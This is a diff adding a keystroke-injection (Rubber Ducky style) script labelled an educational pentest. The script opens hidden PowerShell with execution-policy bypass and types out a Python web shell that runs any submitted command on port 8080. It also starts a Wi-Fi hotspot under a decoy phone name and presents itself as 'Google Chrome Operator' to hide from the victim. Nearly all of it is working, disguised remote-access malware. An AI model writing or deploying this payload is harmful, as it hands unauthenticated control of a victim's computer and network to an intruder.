@@ -1,0 +1,67 @@
+REM Educational Pentest: Hidden Webserver + WiFi Hotspot + Remote Access
+REM Disguises as "Google Chrome Operator" in Task Manager
+REM Access via http://[target-ip]:8080
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File C:\\Users\\Public\\pentest.py' -WindowStyle Hidden"
+ENTER
+DELAY 500
+REM Create the payload script
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 500
+REM Type the Python webserver payload
+STRING import socket, subprocess, threading, os, time;from http.server import HTTPServer, BaseHTTPRequestHandler
+STRING 
+STRING class WebShell(BaseHTTPRequestHandler):
+STRING     def do_GET(self):
+STRING         if self.path == '/':
+STRING             self.send_response(200)
+STRING             self.send_header('Content-type','text/html')
+STRING             self.end_headers()
+STRING             self.wfile.write(b'''<html><body><h1>Remote Access Console (Educational Pentest)</h1><form method="POST"><textarea name="cmd" rows="10" cols="80"></textarea><br><input type="submit" value="Execute"></form>''')
+STRING         else:
+STRING             self.send_response(404)
+STRING             self.end_headers()
+STRING 
+STRING     def do_POST(self):
+STRING         content_length = int(self.headers['Content-Length'])
+STRING         post_data = self.rfile.read(content_length).decode('utf-8')
+STRING         cmd = post_data.split('cmd=')[1].replace('+',' ').replace('%20',' ')
+STRING         try:
+STRING             result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+STRING         except:
+STRING             result = 'Command failed'
+STRING         self.send_response(200)
+STRING         self.send_header('Content-type','text/html')
+STRING         self.end_headers()
+STRING         self.wfile.write(f'''<html><body><pre>{result}</pre><form method="POST"><textarea name="cmd" rows="10" cols="80"></textarea><br><input type="submit" value="Execute"></form>'''.encode())
+STRING 
+STRING def setup_hotspot():
+STRING     try:
+STRING         os.system('netsh wlan set hostednetwork mode=allow ssid="Darrens Iphone" key="brucenet"')
+STRING         os.system('netsh wlan start hostednetwork')
+STRING     except: pass
+STRING 
+STRING print('Google Chrome Operator v1.2.3')
+STRING print('Initializing network services...')
+STRING 
+STRING t1 = threading.Thread(target=setup_hotspot)
+STRING t1.daemon = True
+STRING t1.start()
+STRING 
+STRING server = HTTPServer(('0.0.0.0', 8080), WebShell)
+STRING print('Web interface ready at http://0.0.0.0:8080')
+STRING print('Educational pentest server running...')
+STRING server.serve_forever()
+ENTER
+CTRL s
+DELAY 200
+STRING C:\Users\Public\pentest.py
+ENTER
+DELAY 500
+ALT f4
